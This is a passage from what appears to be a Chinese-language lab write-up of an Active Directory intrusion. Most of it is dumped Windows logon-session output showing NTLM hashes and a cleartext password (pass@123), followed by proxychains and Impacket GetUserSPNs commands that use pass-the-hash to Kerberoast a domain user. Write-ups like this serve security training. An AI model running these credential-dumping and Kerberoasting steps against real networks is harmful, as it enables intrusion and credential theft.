 * Domain   : XIAORANG</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : xiaorang.lab</span><br><span class="line">         * Password : e9 54 f2 60 48 67 2e b8 3c fe e4 be 9a fe 37 55 f5 04 df 78 90 c0 3d 4e 2e 9e 9b 20 9f 0c 88 39 97 90 18 36 70 6e 98 0e cd 78 33 42 4d d7 e9 e5 af 9f 5a 9f fc fb d0 8a b9 1f af 67 b0 cf 90 bd 8c 2b e0 20 a6 f1 6c 70 fa 84 54 94 a2 47 23 b0 57 75 61 15 3f 39 a1 02 76 d3 72 eb a5 41 db e1 f0 22 44 ce fc 54 a9 75 84 e6 6c 48 fe 8a ac 84 6a 41 d1 99 1e 94 aa 70 4c 3d 56 8e dc 18 db 88 56 40 a8 cc 5d 50 61 14 c0 81 86 f1 02 14 aa 1c cd 59 3b 0e 8f 63 9a f2 40 00 65 39 95 7a 1e 40 85 a9 85 65 73 03 9e 0e 3e 99 52 fd 96 e7 17 3c 4e 93 07 77 6e 7a 56 d4 1a d4 a3 3c 3b e3 c0 41 4c 26 fe 6e 4c ad 0e f6 fa 7b d6 ad 69 c1 4e 93 38 dc 77 2a 63 f5 77 e1 0a 9a 20 88 87 7f 63 58 ac fa 1b c7 19 b1 86 71 47 8f 32 30 07 05 28 95</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line">        cloudap :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 64247 (00000000:0000faf7)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : DWM-1</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/2 12:52:16</span><br><span class="line">SID               : S-1-5-90-0-1</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * NTLM     : 8519c5a89b2cd4d679a5a36f26863e5d</span><br><span class="line">         * SHA1     : 42d8188bc30ff0880b838e368c6e5522b86f978d</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : xiaorang.lab</span><br><span class="line">         * Password : &amp;H!vqg]om0Iz5Pn1NUGod&amp;R9o /!$EK.?jn06+[J*6oZ\A+H?c2;V\(AgGpKw*f0W\vdUf;QoJ/5#DRZDwR@W5U9Io8`;zE7L&quot;:Ay-SKpe#&gt;5S?;IL&#x27;HarDD</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line">        cloudap :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 64229 (00000000:0000fae5)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : DWM-1</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/2 12:52:16</span><br><span class="line">SID               : S-1-5-90-0-1</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * NTLM     : 6cb8f3797fb44d3ee3a0cd55ea6ff8f1</span><br><span class="line">         * SHA1     : e9f071d7de06d0492a584daea984695504f6dd51</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : xiaorang.lab</span><br><span class="line">         * Password : e9 54 f2 60 48 67 2e b8 3c fe e4 be 9a fe 37 55 f5 04 df 78 90 c0 3d 4e 2e 9e 9b 20 9f 0c 88 39 97 90 18 36 70 6e 98 0e cd 78 33 42 4d d7 e9 e5 af 9f 5a 9f fc fb d0 8a b9 1f af 67 b0 cf 90 bd 8c 2b e0 20 a6 f1 6c 70 fa 84 54 94 a2 47 23 b0 57 75 61 15 3f 39 a1 02 76 d3 72 eb a5 41 db e1 f0 22 44 ce fc 54 a9 75 84 e6 6c 48 fe 8a ac 84 6a 41 d1 99 1e 94 aa 70 4c 3d 56 8e dc 18 db 88 56 40 a8 cc 5d 50 61 14 c0 81 86 f1 02 14 aa 1c cd 59 3b 0e 8f 63 9a f2 40 00 65 39 95 7a 1e 40 85 a9 85 65 73 03 9e 0e 3e 99 52 fd 96 e7 17 3c 4e 93 07 77 6e 7a 56 d4 1a d4 a3 3c 3b e3 c0 41 4c 26 fe 6e 4c ad 0e f6 fa 7b d6 ad 69 c1 4e 93 38 dc 77 2a 63 f5 77 e1 0a 9a 20 88 87 7f 63 58 ac fa 1b c7 19 b1 86 71 47 8f 32 30 07 05 28 95</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line">        cloudap :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 996 (00000000:000003e4)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : XR-0923$</span><br><span class="line">Domain            : XIAORANG</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/2 12:52:15</span><br><span class="line">SID               : S-1-5-20</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * NTLM     : 6cb8f3797fb44d3ee3a0cd55ea6ff8f1</span><br><span class="line">         * SHA1     : e9f071d7de06d0492a584daea984695504f6dd51</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : xr-0923$</span><br><span class="line">         * Domain   : XIAORANG.LAB</span><br><span class="line">         * Password : e9 54 f2 60 48 67 2e b8 3c fe e4 be 9a fe 37 55 f5 04 df 78 90 c0 3d 4e 2e 9e 9b 20 9f 0c 88 39 97 90 18 36 70 6e 98 0e cd 78 33 42 4d d7 e9 e5 af 9f 5a 9f fc fb d0 8a b9 1f af 67 b0 cf 90 bd 8c 2b e0 20 a6 f1 6c 70 fa 84 54 94 a2 47 23 b0 57 75 61 15 3f 39 a1 02 76 d3 72 eb a5 41 db e1 f0 22 44 ce fc 54 a9 75 84 e6 6c 48 fe 8a ac 84 6a 41 d1 99 1e 94 aa 70 4c 3d 56 8e dc 18 db 88 56 40 a8 cc 5d 50 61 14 c0 81 86 f1 02 14 aa 1c cd 59 3b 0e 8f 63 9a f2 40 00 65 39 95 7a 1e 40 85 a9 85 65 73 03 9e 0e 3e 99 52 fd 96 e7 17 3c 4e 93 07 77 6e 7a 56 d4 1a d4 a3 3c 3b e3 c0 41 4c 26 fe 6e 4c ad 0e f6 fa 7b d6 ad 69 c1 4e 93 38 dc 77 2a 63 f5 77 e1 0a 9a 20 88 87 7f 63 58 ac fa 1b c7 19 b1 86 71 47 8f 32 30 07 05 28 95</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line">        cloudap :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 33451 (00000000:000082ab)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : UMFD-1</span><br><span class="line">Domain            : Font Driver Host</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/2 12:52:15</span><br><span class="line">SID               : S-1-5-96-0-1</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * NTLM     : 6cb8f3797fb44d3ee3a0cd55ea6ff8f1</span><br><span class="line">         * SHA1     : e9f071d7de06d0492a584daea984695504f6dd51</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : xiaorang.lab</span><br><span class="line">         * Password : e9 54 f2 60 48 67 2e b8 3c fe e4 be 9a fe 37 55 f5 04 df 78 90 c0 3d 4e 2e 9e 9b 20 9f 0c 88 39 97 90 18 36 70 6e 98 0e cd 78 33 42 4d d7 e9 e5 af 9f 5a 9f fc fb d0 8a b9 1f af 67 b0 cf 90 bd 8c 2b e0 20 a6 f1 6c 70 fa 84 54 94 a2 47 23 b0 57 75 61 15 3f 39 a1 02 76 d3 72 eb a5 41 db e1 f0 22 44 ce fc 54 a9 75 84 e6 6c 48 fe 8a ac 84 6a 41 d1 99 1e 94 aa 70 4c 3d 56 8e dc 18 db 88 56 40 a8 cc 5d 50 61 14 c0 81 86 f1 02 14 aa 1c cd 59 3b 0e 8f 63 9a f2 40 00 65 39 95 7a 1e 40 85 a9 85 65 73 03 9e 0e 3e 99 52 fd 96 e7 17 3c 4e 93 07 77 6e 7a 56 d4 1a d4 a3 3c 3b e3 c0 41 4c 26 fe 6e 4c ad 0e f6 fa 7b d6 ad 69 c1 4e 93 38 dc 77 2a 63 f5 77 e1 0a 9a 20 88 87 7f 63 58 ac fa 1b c7 19 b1 86 71 47 8f 32 30 07 05 28 95</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line">        cloudap :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 6540654 (00000000:0063cd6e)</span><br><span class="line">Session           : RemoteInteractive from 3</span><br><span class="line">User Name         : Tsuki</span><br><span class="line">Domain            : XR-0923</span><br><span class="line">Logon Server      : XR-0923</span><br><span class="line">Logon Time        : 2025/3/2 14:02:49</span><br><span class="line">SID               : S-1-5-21-754105099-1176710061-2177073800-1002</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : Tsuki</span><br><span class="line">         * Domain   : XR-0923</span><br><span class="line">         * NTLM     : 51a52c415264a8fc31520f66f2f50459</span><br><span class="line">         * SHA1     : fd8d24d6cc3b3cb3980fc67a4e83a3023af0c508</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : Tsuki</span><br><span class="line">         * Domain   : XR-0923</span><br><span class="line">         * Password : pass@123</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : Tsuki</span><br><span class="line">         * Domain   : XR-0923</span><br><span class="line">         * Password : (null)</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line">        cloudap :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 6540590 (00000000:0063cd2e)</span><br><span class="line">Session           : RemoteInteractive from 3</span><br><span class="line">User Name         : Tsuki</span><br><span class="line">Domain            : XR-0923</span><br><span class="line">Logon Server      : XR-0923</span><br><span class="line">Logon Time        : 2025/3/2 14:02:49</span><br><span class="line">SID               : S-1-5-21-754105099-1176710061-2177073800-1002</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : Tsuki</span><br><span class="line">         * Domain   : XR-0923</span><br><span class="line">         * NTLM     : 51a52c415264a8fc31520f66f2f50459</span><br><span class="line">         * SHA1     : fd8d24d6cc3b3cb3980fc67a4e83a3023af0c508</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : Tsuki</span><br><span class="line">         * Domain   : XR-0923</span><br><span class="line">         * Password : pass@123</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : Tsuki</span><br><span class="line">         * Domain   : XR-0923</span><br><span class="line">         * Password : pass@123</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line">        cloudap :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 6526244 (00000000:00639524)</span><br><span class="line">Session           : Interactive from 3</span><br><span class="line">User Name         : DWM-3</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/2 14:02:49</span><br><span class="line">SID               : S-1-5-90-0-3</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * NTLM     : 6cb8f3797fb44d3ee3a0cd55ea6ff8f1</span><br><span class="line">         * SHA1     : e9f071d7de06d0492a584daea984695504f6dd51</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : xiaorang.lab</span><br><span class="line">         * Password : e9 54 f2 60 48 67 2e b8 3c fe e4 be 9a fe 37 55 f5 04 df 78 90 c0 3d 4e 2e 9e 9b 20 9f 0c 88 39 97 90 18 36 70 6e 98 0e cd 78 33 42 4d d7 e9 e5 af 9f 5a 9f fc fb d0 8a b9 1f af 67 b0 cf 90 bd 8c 2b e0 20 a6 f1 6c 70 fa 84 54 94 a2 47 23 b0 57 75 61 15 3f 39 a1 02 76 d3 72 eb a5 41 db e1 f0 22 44 ce fc 54 a9 75 84 e6 6c 48 fe 8a ac 84 6a 41 d1 99 1e 94 aa 70 4c 3d 56 8e dc 18 db 88 56 40 a8 cc 5d 50 61 14 c0 81 86 f1 02 14 aa 1c cd 59 3b 0e 8f 63 9a f2 40 00 65 39 95 7a 1e 40 85 a9 85 65 73 03 9e 0e 3e 99 52 fd 96 e7 17 3c 4e 93 07 77 6e 7a 56 d4 1a d4 a3 3c 3b e3 c0 41 4c 26 fe 6e 4c ad 0e f6 fa 7b d6 ad 69 c1 4e 93 38 dc 77 2a 63 f5 77 e1 0a 9a 20 88 87 7f 63 58 ac fa 1b c7 19 b1 86 71 47 8f 32 30 07 05 28 95</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line">        cloudap :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 6525306 (00000000:0063917a)</span><br><span class="line">Session           : Interactive from 3</span><br><span class="line">User Name         : DWM-3</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/2 14:02:49</span><br><span class="line">SID               : S-1-5-90-0-3</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * NTLM     : 6cb8f3797fb44d3ee3a0cd55ea6ff8f1</span><br><span class="line">         * SHA1     : e9f071d7de06d0492a584daea984695504f6dd51</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : xiaorang.lab</span><br><span class="line">         * Password : e9 54 f2 60 48 67 2e b8 3c fe e4 be 9a fe 37 55 f5 04 df 78 90 c0 3d 4e 2e 9e 9b 20 9f 0c 88 39 97 90 18 36 70 6e 98 0e cd 78 33 42 4d d7 e9 e5 af 9f 5a 9f fc fb d0 8a b9 1f af 67 b0 cf 90 bd 8c 2b e0 20 a6 f1 6c 70 fa 84 54 94 a2 47 23 b0 57 75 61 15 3f 39 a1 02 76 d3 72 eb a5 41 db e1 f0 22 44 ce fc 54 a9 75 84 e6 6c 48 fe 8a ac 84 6a 41 d1 99 1e 94 aa 70 4c 3d 56 8e dc 18 db 88 56 40 a8 cc 5d 50 61 14 c0 81 86 f1 02 14 aa 1c cd 59 3b 0e 8f 63 9a f2 40 00 65 39 95 7a 1e 40 85 a9 85 65 73 03 9e 0e 3e 99 52 fd 96 e7 17 3c 4e 93 07 77 6e 7a 56 d4 1a d4 a3 3c 3b e3 c0 41 4c 26 fe 6e 4c ad 0e f6 fa 7b d6 ad 69 c1 4e 93 38 dc 77 2a 63 f5 77 e1 0a 9a 20 88 87 7f 63 58 ac fa 1b c7 19 b1 86 71 47 8f 32 30 07 05 28 95</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line">        cloudap :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 6524657 (00000000:00638ef1)</span><br><span class="line">Session           : Interactive from 3</span><br><span class="line">User Name         : UMFD-3</span><br><span class="line">Domain            : Font Driver Host</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/2 14:02:49</span><br><span class="line">SID               : S-1-5-96-0-3</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * NTLM     : 6cb8f3797fb44d3ee3a0cd55ea6ff8f1</span><br><span class="line">         * SHA1     : e9f071d7de06d0492a584daea984695504f6dd51</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : xiaorang.lab</span><br><span class="line">         * Password : e9 54 f2 60 48 67 2e b8 3c fe e4 be 9a fe 37 55 f5 04 df 78 90 c0 3d 4e 2e 9e 9b 20 9f 0c 88 39 97 90 18 36 70 6e 98 0e cd 78 33 42 4d d7 e9 e5 af 9f 5a 9f fc fb d0 8a b9 1f af 67 b0 cf 90 bd 8c 2b e0 20 a6 f1 6c 70 fa 84 54 94 a2 47 23 b0 57 75 61 15 3f 39 a1 02 76 d3 72 eb a5 41 db e1 f0 22 44 ce fc 54 a9 75 84 e6 6c 48 fe 8a ac 84 6a 41 d1 99 1e 94 aa 70 4c 3d 56 8e dc 18 db 88 56 40 a8 cc 5d 50 61 14 c0 81 86 f1 02 14 aa 1c cd 59 3b 0e 8f 63 9a f2 40 00 65 39 95 7a 1e 40 85 a9 85 65 73 03 9e 0e 3e 99 52 fd 96 e7 17 3c 4e 93 07 77 6e 7a 56 d4 1a d4 a3 3c 3b e3 c0 41 4c 26 fe 6e 4c ad 0e f6 fa 7b d6 ad 69 c1 4e 93 38 dc 77 2a 63 f5 77 e1 0a 9a 20 88 87 7f 63 58 ac fa 1b c7 19 b1 86 71 47 8f 32 30 07 05 28 95</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line">        cloudap :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 4884110 (00000000:004a868e)</span><br><span class="line">Session           : RemoteInteractive from 2</span><br><span class="line">User Name         : zhangshuai</span><br><span class="line">Domain            : XR-0923</span><br><span class="line">Logon Server      : XR-0923</span><br><span class="line">Logon Time        : 2025/3/2 13:49:03</span><br><span class="line">SID               : S-1-5-21-754105099-1176710061-2177073800-1001</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : zhangshuai</span><br><span class="line">         * Domain   : XR-0923</span><br><span class="line">         * NTLM     : f97d5a4b44b11bc257a63c3f76f18a9a</span><br><span class="line">         * SHA1     : f6ff2714d556240436758527e190e329f05cd43d</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : zhangshuai</span><br><span class="line">         * Domain   : XR-0923</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : zhangshuai</span><br><span class="line">         * Domain   : XR-0923</span><br><span class="line">         * Password : (null)</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line">        cloudap :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 4884076 (00000000:004a866c)</span><br><span class="line">Session           : RemoteInteractive from 2</span><br><span class="line">User Name         : zhangshuai</span><br><span class="line">Domain            : XR-0923</span><br><span class="line">Logon Server      : XR-0923</span><br><span class="line">Logon Time        : 2025/3/2 13:49:03</span><br><span class="line">SID               : S-1-5-21-754105099-1176710061-2177073800-1001</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : zhangshuai</span><br><span class="line">         * Domain   : XR-0923</span><br><span class="line">         * NTLM     : f97d5a4b44b11bc257a63c3f76f18a9a</span><br><span class="line">         * SHA1     : f6ff2714d556240436758527e190e329f05cd43d</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : zhangshuai</span><br><span class="line">         * Domain   : XR-0923</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : zhangshuai</span><br><span class="line">         * Domain   : XR-0923</span><br><span class="line">         * Password : (null)</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line">        cloudap :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 4843878 (00000000:0049e966)</span><br><span class="line">Session           : Interactive from 2</span><br><span class="line">User Name         : DWM-2</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/2 13:49:02</span><br><span class="line">SID               : S-1-5-90-0-2</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * NTLM     : 6cb8f3797fb44d3ee3a0cd55ea6ff8f1</span><br><span class="line">         * SHA1     : e9f071d7de06d0492a584daea984695504f6dd51</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : xiaorang.lab</span><br><span class="line">         * Password : e9 54 f2 60 48 67 2e b8 3c fe e4 be 9a fe 37 55 f5 04 df 78 90 c0 3d 4e 2e 9e 9b 20 9f 0c 88 39 97 90 18 36 70 6e 98 0e cd 78 33 42 4d d7 e9 e5 af 9f 5a 9f fc fb d0 8a b9 1f af 67 b0 cf 90 bd 8c 2b e0 20 a6 f1 6c 70 fa 84 54 94 a2 47 23 b0 57 75 61 15 3f 39 a1 02 76 d3 72 eb a5 41 db e1 f0 22 44 ce fc 54 a9 75 84 e6 6c 48 fe 8a ac 84 6a 41 d1 99 1e 94 aa 70 4c 3d 56 8e dc 18 db 88 56 40 a8 cc 5d 50 61 14 c0 81 86 f1 02 14 aa 1c cd 59 3b 0e 8f 63 9a f2 40 00 65 39 95 7a 1e 40 85 a9 85 65 73 03 9e 0e 3e 99 52 fd 96 e7 17 3c 4e 93 07 77 6e 7a 56 d4 1a d4 a3 3c 3b e3 c0 41 4c 26 fe 6e 4c ad 0e f6 fa 7b d6 ad 69 c1 4e 93 38 dc 77 2a 63 f5 77 e1 0a 9a 20 88 87 7f 63 58 ac fa 1b c7 19 b1 86 71 47 8f 32 30 07 05 28 95</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line">        cloudap :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 995 (00000000:000003e3)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : IUSR</span><br><span class="line">Domain            : NT AUTHORITY</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/2 12:52:18</span><br><span class="line">SID               : S-1-5-17</span><br><span class="line">        msv :</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : (null)</span><br><span class="line">         * Domain   : (null)</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line">        cloudap :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 997 (00000000:000003e5)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : LOCAL SERVICE</span><br><span class="line">Domain            : NT AUTHORITY</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/2 12:52:16</span><br><span class="line">SID               : S-1-5-19</span><br><span class="line">        msv :</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : (null)</span><br><span class="line">         * Domain   : (null)</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : (null)</span><br><span class="line">         * Domain   : (null)</span><br><span class="line">         * Password : (null)</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line">        cloudap :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 33422 (00000000:0000828e)</span><br><span class="line">Session           : Interactive from 0</span><br><span class="line">User Name         : UMFD-0</span><br><span class="line">Domain            : Font Driver Host</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/2 12:52:15</span><br><span class="line">SID               : S-1-5-96-0-0</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * NTLM     : 6cb8f3797fb44d3ee3a0cd55ea6ff8f1</span><br><span class="line">         * SHA1     : e9f071d7de06d0492a584daea984695504f6dd51</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : xiaorang.lab</span><br><span class="line">         * Password : e9 54 f2 60 48 67 2e b8 3c fe e4 be 9a fe 37 55 f5 04 df 78 90 c0 3d 4e 2e 9e 9b 20 9f 0c 88 39 97 90 18 36 70 6e 98 0e cd 78 33 42 4d d7 e9 e5 af 9f 5a 9f fc fb d0 8a b9 1f af 67 b0 cf 90 bd 8c 2b e0 20 a6 f1 6c 70 fa 84 54 94 a2 47 23 b0 57 75 61 15 3f 39 a1 02 76 d3 72 eb a5 41 db e1 f0 22 44 ce fc 54 a9 75 84 e6 6c 48 fe 8a ac 84 6a 41 d1 99 1e 94 aa 70 4c 3d 56 8e dc 18 db 88 56 40 a8 cc 5d 50 61 14 c0 81 86 f1 02 14 aa 1c cd 59 3b 0e 8f 63 9a f2 40 00 65 39 95 7a 1e 40 85 a9 85 65 73 03 9e 0e 3e 99 52 fd 96 e7 17 3c 4e 93 07 77 6e 7a 56 d4 1a d4 a3 3c 3b e3 c0 41 4c 26 fe 6e 4c ad 0e f6 fa 7b d6 ad 69 c1 4e 93 38 dc 77 2a 63 f5 77 e1 0a 9a 20 88 87 7f 63 58 ac fa 1b c7 19 b1 86 71 47 8f 32 30 07 05 28 95</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line">        cloudap :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 32336 (00000000:00007e50)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : (null)</span><br><span class="line">Domain            : (null)</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/2 12:52:15</span><br><span class="line">SID               :</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * NTLM     : 6cb8f3797fb44d3ee3a0cd55ea6ff8f1</span><br><span class="line">         * SHA1     : e9f071d7de06d0492a584daea984695504f6dd51</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">        kerberos :</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line">        cloudap :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 999 (00000000:000003e7)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : XR-0923$</span><br><span class="line">Domain            : XIAORANG</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/2 12:52:15</span><br><span class="line">SID               : S-1-5-18</span><br><span class="line">        msv :</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : xr-0923$</span><br><span class="line">         * Domain   : XIAORANG.LAB</span><br><span class="line">         * Password : (null)</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line">        cloudap :</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>向域控查询注册了SPN的用户</p>
+<p><code>proxychains python GetUserSPNs.py xiaorang.lab/&#39;XR-0923$&#39; -hashes &#39;:6cb8f3797fb44d3ee3a0cd55ea6ff8f1&#39; -dc-ip 172.22.14.11</code></p>
+<p><img src="/2024/07/30/hello-world/e-wp/image-20250302142532520.png" alt="image-20250302142532520"></p>
+<p>获取此用户的ST</p>
+<p><code>proxychains python GetUserSPNs.py xiaorang.lab/&#39;XR-0923$&#39; -hashes :6cb8f3797fb44d3ee3a0cd55ea6ff8f1 -dc-ip 172.22.14.11 -request-user tianjing</code></p>
+<p><img src="/2024/07/30/hello-world/e-wp/image-20250302142712806.png" alt="image-20250302142712806"></p>
+<p>hash.txt</p>
